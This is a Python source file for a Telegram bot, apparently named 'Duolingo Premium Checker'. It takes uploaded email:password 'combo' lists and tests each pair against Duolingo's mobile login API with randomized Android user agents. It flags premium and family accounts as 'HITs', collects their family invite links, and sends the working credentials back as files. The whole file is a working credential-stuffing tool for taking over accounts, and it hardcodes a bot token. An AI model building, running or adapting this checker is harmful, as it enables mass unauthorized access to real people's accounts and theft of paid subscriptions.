import telebot
import requests
import json
import time
import uuid
import logging
import threading
from datetime import datetime

# ========== CONFIGURATION ==========
BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
ADMIN_ID = 8770379893
# ===================================

logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO, datefmt='%H:%M:%S')

bot = telebot.TeleBot(BOT_TOKEN)

checking_active = False
stop_flag = False

def get_headers(ua, jwt=None):
    headers = {
        "User-Agent": ua,
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip",
        "Accept-Language": "en-US,en;q=0.8",
        "Host": "android-api.duolingo.cn",
        "X-Amzn-Trace-Id": "User=0"
    }
    if jwt:
        headers["Authorization"] = f"Bearer {jwt}"
        headers["Accept"] = "application/json"
        headers["Connection"] = "Keep-Alive"
    return headers

def generate_ua():
    versions = ["10", "11", "12", "13"]
    models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11"]
    return f"Dalvik/2.1.0 (Linux; U; Android {versions[hash(str(time.time())) % len(versions)]}; {models[hash(str(time.time())) % len(models)]} Build/RP1A.200720.012)"

def get_error_type(exception):
    error_str = str(exception).lower()
    if "timeout" in error_str:
        return "⏱️ Timeout"
    elif "connection" in error_str:
        return "🔌 Connection Error"
    elif "406" in error_str:
        return "🚫 406 - Not Acceptable"
    elif "429" in error_str:
        return "🐌 429 - Rate Limit"
    elif "500" in error_str or "502" in error_str or "503" in error_str:
        return "⚠️ Server Error"
    else:
        return f"❌ {str(exception)[:30]}"

def is_premium_account(data):
    """
    အတိအကျ premium ဟုတ်မဟုတ် စစ်တယ်
    မင်း Config ရဲ့ has_item_premium_subscription ကို primary အဖြစ်သုံးတယ်
    """
    
    # PRIMARY: has_item_premium_subscription (မင်း Config အတိုင်း)
    if data.get("has_item_premium_subscription") == True:
        return True, "PREMIUM", None
    
    # SECONDARY: hasPlus
    if data.get("hasPlus") == True:
        return True, "PREMIUM", None
    
    # Check shopItems for real subscription
    shop_items = data.get("shopItems", [])
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        if sub_info and sub_info.get("productId") and sub_info.get("productId") != "N/A":
            return True, "PREMIUM", None
        
        family_info = item.get("familyPlanInfo", {})
        if family_info and family_info.get("inviteToken"):
            return True, "FAMILY", family_info.get("inviteToken")
    
    # Check subscriptionConfigs
    sub_configs = data.get("subscriptionConfigs", [])
    for sub in sub_configs:
        if sub.get("productId") and sub.get("productId") != "N/A":
            return True, "PREMIUM", None
    
    return False, "FREE", None

def extract_subscription_details(data):
    """Extract subscription details ONLY if premium is confirmed"""
    
    details = {
        "product_id": "Unknown",
        "renewing": "Unknown",
        "expiry": "Unknown",
        "invite_token": None
    }
    
    # Check shopItems
    shop_items = data.get("shopItems", [])
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        if sub_info:
            if sub_info.get("productId") and sub_info.get("productId") != "N/A":
                details["product_id"] = sub_info.get("productId")
            if sub_info.get("renewing") is not None:
                details["renewing"] = "Yes" if sub_info.get("renewing") else "No"
            if sub_info.get("expectedExpiration"):
                expiry_ms = sub_info.get("expectedExpiration")
                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
        
        family_info = item.get("familyPlanInfo", {})
        if family_info and family_info.get("inviteToken"):
            details["invite_token"] = family_info.get("inviteToken")
    
    # Check subscriptionConfigs as fallback
    if details["product_id"] == "Unknown":
        sub_configs = data.get("subscriptionConfigs", [])
        for sub in sub_configs:
            if sub.get("productId") and sub.get("productId") != "N/A":
                details["product_id"] = sub.get("productId")
    
    return details

def check_duolingo(email, password):
    session = requests.Session()
    ua = generate_ua()
    
    try:
        # STEP 1: Login
        login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
        distinct_id = str(uuid.uuid4())
        
        login_payload = {
            "distinctId": distinct_id,
            "identifier": email,
            "password": password
        }
        
        login_headers = get_headers(ua)
        login_headers["Content-Type"] = "application/json"
        
        resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=15)
        
        if resp.status_code != 200:
            return "FAIL", "wrong credentials", None, None
        
        login_data = resp.json()
        user_id = login_data.get("id")
        if not user_id:
            return "FAIL", "no user id", None, None
        
        # STEP 2: Get JWT from cookies
        jwt_token = None
        for cookie in session.cookies:
            if cookie.name == "jwt_token":
                jwt_token = cookie.value
                break
        
        if not jwt_token:
            return "FAIL", "no jwt token", None, None
        
        # STEP 3: Get full profile with ALL fields
        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CsubscriptionConfigs%2CplusDiscounts%2CcreatedAt%2Ccourses%7Btitle%2Cid%2ClearningLanguage%2CfromLanguage%2Cxp%2Ccrowns%7D"
        
        profile_headers = get_headers(ua, jwt_token)
        
        resp2 = session.get(profile_url, headers=profile_headers, timeout=15)
        
        if resp2.status_code != 200:
            return "FAIL", f"profile error {resp2.status_code}", None, None
        
        data = resp2.json()
        
        # Extract basic info
        username = data.get("username", "N/A")
        total_xp = data.get("totalXp", 0)
        gems = data.get("gemsConfig", {}).get("gems", 0) if data.get("gemsConfig") else 0
        streak = data.get("streakData", {}).get("length", 0) if data.get("streakData") else 0
        learning_lang = data.get("learningLanguage", "N/A")
        from_lang = data.get("fromLanguage", "N/A")
        created_at = data.get("createdAt", "Unknown")
        
        # Check if premium (using Config's has_item_premium_subscription)
        is_premium, plan_type, invite_token = is_premium_account(data)
        
        # FREE account (login success but no premium)
        if not is_premium:
            free_result = f"⚠️ FREE | {email}:{password} | {username} | XP:{total_xp} | Streak:{streak} | {learning_lang}"
            return "FREE", free_result, None, None
        
        # PREMIUM account - get subscription details
        sub_details = extract_subscription_details(data)
        if invite_token:
            sub_details["invite_token"] = invite_token
        
        # Build HIT result
        plan_icon = "👨‍👩‍👧" if plan_type == "FAMILY" else "⭐"
        plan_name = "FAMILY PLAN" if plan_type == "FAMILY" else "SUPER/PREMIUM"
        
        result = f"""
✅ **PREMIUM HIT!**

📊 **ACCOUNT:**
├─ Email: `{email}:{password}`
├─ Username: `{username}`
├─ Total XP: `{total_xp:,}`
├─ Streak: `{streak} days` 🔥
├─ Learning: `{learning_lang}` (from `{from_lang}`)
└─ Plan: {plan_icon} **{plan_name}**

💎 **SUBSCRIPTION DETAILS:**
├─ Product ID: `{sub_details['product_id']}`
├─ Auto-Renew: `{sub_details['renewing']}`
└─ Expires: `{sub_details['expiry']}`

📅 Account created: `{created_at[:10] if created_at != 'Unknown' else 'Unknown'}`

📱 Checked by: [ DUOLINGO ] BY ThuYa V3
"""
        
        if sub_details["invite_token"]:
            invite_link = f"https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}"
            result += f"\n🔗 **FAMILY INVITE LINK:**\n`{invite_link}`"
        
        return "HIT", result, None, None
        
    except requests.exceptions.Timeout:
        return "ERROR", "Timeout", "⏱️ Request timeout", None
    except requests.exceptions.ConnectionError:
        return "ERROR", "Connection Error", "🔌 Cannot connect to API", None
    except Exception as e:
        return "ERROR", str(e)[:50], get_error_type(e), None

def make_progress_bar(percent, width=20):
    filled = int(width * percent / 100)
    bar = "▓" * filled + "░" * (width - filled)
    return f"[{bar}] {percent:.1f}%"

def process_combos(chat_id, combos, message_id):
    global checking_active, stop_flag
    
    checking_active = True
    stop_flag = False
    
    total = len(combos)
    hit_count = 0
    free_count = 0
    fail_count = 0
    error_count = 0
    error_types = {}
    
    start_time = time.time()
    premium_hits = []
    free_accounts = []
    
    for i, (email, pwd) in enumerate(combos):
        if stop_flag:
            bot.send_message(chat_id, "🛑 **Stopped by user.**", parse_mode="Markdown")
            break
        
        current = i + 1
        percent = (current / total) * 100
        elapsed = time.time() - start_time
        
        short_email = email[:25] + "..." if len(email) > 28 else email
        
        status, detail, error_detail, _ = check_duolingo(email, pwd)
        
        if status == "HIT":
            hit_count += 1
            premium_hits.append((email, pwd, detail))
            bot.send_message(chat_id, detail, parse_mode="Markdown")
            logging.info(f"✅ HIT: {email}")
        elif status == "FREE":
            free_count += 1
            free_accounts.append((email, pwd, detail))
            logging.info(f"⚠️ FREE: {email}")
        elif status == "ERROR":
            error_count += 1
            err_type = error_detail if error_detail else detail
            error_types[err_type] = error_types.get(err_type, 0) + 1
            logging.info(f"🔴 ERROR: {email} - {err_type}")
        else:
            fail_count += 1
            logging.info(f"❌ FAIL: {email}")
        
        # Update progress every 5 combos
        if current % 5 == 0 or current == total or stop_flag:
            progress_bar = make_progress_bar(percent)
            
            error_summary = ""
            if error_types:
                err_list = list(error_types.items())[:3]
                error_summary = "\n".join([f"   ├─ {k}: {v}" for k, v in err_list])
                if len(error_types) > 3:
                    error_summary += f"\n   └─ +{len(error_types)-3} more"
            
            progress_text = f"""
**🔍 Duolingo Checker** | BY ThuYa V3

`{progress_bar}`
`📧` **Now:** `{short_email}`

**📊 Stats:**
├─ `{current}/{total}` checked
├─ ✅ **HIT (Premium):** `{hit_count}`
├─ ⚠️ **FREE:** `{free_count}`
├─ ❌ **FAIL:** `{fail_count}`
└─ 🔴 **ERROR:** `{error_count}`

⏱️ **Time:** `{elapsed:.1f}s`

{error_summary if error_summary else "✅ No errors yet"}

_Use /stop to cancel_
"""
            try:
                bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
            except:
                pass
        
        time.sleep(1.5)
    
    elapsed = time.time() - start_time
    progress_bar = make_progress_bar(100)
    
    final_summary = f"""
**✅ CHECK COMPLETED!** | BY ThuYa V3

`{progress_bar}`
`{total}/{total}` checked in `{elapsed:.1f}s`

**📊 FINAL STATS:**
├─ ✅ **HIT (Premium/Family):** `{hit_count}`
├─ ⚠️ **FREE Accounts:** `{free_count}`
├─ ❌ **FAIL (Wrong credentials):** `{fail_count}`
└─ 🔴 **ERROR (Network/API):** `{error_count}`

💾 **Premium hits saved below 👇**
"""
    bot.send_message(chat_id, final_summary, parse_mode="Markdown")
    
    # Send premium hits file
    if premium_hits:
        hit_content = f"# [ DUOLINGO ] BY ThuYa V3\n# Author: @thuyaaungzaw\n# Premium/Family Accounts\n# Total: {len(premium_hits)}\n\n"
        for email, pwd, result in premium_hits:
            hit_content += f"{email}:{pwd}\n{result}\n{'='*60}\n\n"
        
        with open("premium_hits.txt", "w", encoding="utf-8") as f:
            f.write(hit_content)
        
        with open("premium_hits.txt", "rb") as f:
            bot.send_document(chat_id, f)
    else:
        bot.send_message(chat_id, "No premium/family accounts found.")
    
    # Send free accounts file
    if free_accounts:
        free_content = f"# FREE Accounts (Login Success - No Premium)\n# Total: {len(free_accounts)}\n\n"
        for email, pwd, detail in free_accounts:
            free_content += f"{email}:{pwd}\n{detail}\n{'='*50}\n\n"
        
        with open("free_accounts.txt", "w", encoding="utf-8") as f:
            f.write(free_content)
        
        with open("free_accounts.txt", "rb") as f:
            bot.send_document(chat_id, f)
    
    checking_active = False
    stop_flag = False

@bot.message_handler(commands=['start'])
def start_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized user.")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn = telebot.types.KeyboardButton("📂 Check Duolingo Premium Accounts")
    markup.add(btn)
    
    bot.reply_to(
        message,
        "👋 **Duolingo Premium Account Checker**\n\n"
        "**Config:** [ DUOLINGO ] BY ThuYa V3\n"
        "**Author:** @thuyaaungzaw\n\n"
        "📂 Click button below → Send combo file (email:pass)\n\n"
        "**Results:**\n"
        "✅ **HIT** → Premium/Family (real subscription)\n"
        "⚠️ **FREE** → Login success, no premium\n"
        "❌ **FAIL** → Wrong credentials\n"
        "🔴 **ERROR** → Network/API issue\n\n"
        "🛑 Use `/stop` to cancel",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(commands=['stop'])
def stop_command(message):
    global stop_flag, checking_active
    
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized.")
        return
    
    if checking_active:
        stop_flag = True
        bot.reply_to(message, "🛑 **Stopping...** Please wait.")
    else:
        bot.reply_to(message, "ℹ️ No active check.")

@bot.message_handler(func=lambda m: m.text == "📂 Check Duolingo Premium Accounts")
def ask_file(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "📎 Send your **email:pass** combo file (.txt)", parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    global checking_active
    
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized")
        return
    
    if checking_active:
        bot.reply_to(message, "⚠️ Check running. Use /stop first.")
        return
    
    status_msg = bot.reply_to(message, "📥 Downloading...")
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    content = downloaded_file.decode('utf-8', errors='ignore')
    combos = []
    for line in content.split('\n'):
        line = line.strip()
        if ':' in line and line.count(':') == 1:
            email, pwd = line.split(':', 1)
            combos.append((email.strip(), pwd.strip()))
    
    if not combos:
        bot.edit_message_text("❌ No valid combos. Format: email:pass", status_msg.chat.id, status_msg.message_id)
        return
    
    thread = threading.Thread(target=process_combos, args=(message.chat.id, combos, status_msg.message_id))
    thread.start()

print("🤖 Duolingo Premium Checker Bot is running...")
print("Config: [ DUOLINGO ] BY ThuYa V3")
print("Author: @thuyaaungzaw")
print("Premium Detection: has_item_premium_subscription (Config match)")
print("Features: ✅ HIT | ⚠️ FREE | ❌ FAIL | 🔴 ERROR | Progress Bar | /stop")
bot.infinity_polling()
